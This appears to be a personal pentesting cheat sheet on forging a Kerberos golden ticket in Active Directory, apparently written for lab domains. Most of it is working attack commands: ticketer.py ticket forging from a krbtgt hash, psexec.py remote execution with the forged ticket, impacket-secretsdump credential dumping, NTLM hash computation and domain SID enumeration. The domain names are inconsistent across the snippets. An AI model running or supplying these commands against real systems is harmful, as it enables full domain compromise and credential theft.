---
sticker: emoji//1f3ab
---
### Requirements
- Knowledge of the domain name
- Knowledge of the domain SID
- The NTLM hash of the krbtgt account
- FQDN

```shell
ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park administrator

export KRB5CCNAME=administrator.ccache

psexec.py sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local -k -no-pass
```



---

### getting `NTLM` hash or the plain password:

 1. using impacket-secretdump (has to be domain admin account) 
 ```shell
 impacket-secretsdump 'north.sevenkingdoms.local/vagrant:vagrant@192.168.56.11'
```
 
 2.  mimkatz LSASS dump
 3. DCSync attack 
 4. Kerberoast > Crack > NTLM
 ```shell
 # this will get us the NTLM hash
 echo -n 'Password123!' | iconv -f utf-8 -t utf-16le | openssl dgst -md4 
```

---
### Getting Domain SID:
its basically the first part of any SID object.
```powershell
nxc:
nxc ldap lol.local -u sqlsvc -p test -k --get-sid

ldapsearch:
ldapsearch -x -H ldap://<DC_IP> -b "" -s base objectSid

impacket-GetADUsers:
impacket-GetADUsers domain/user:password@<DC_IP> -all

rpcclient:
rpcclient $> lookupdomain north.sevenkingdoms.local
```


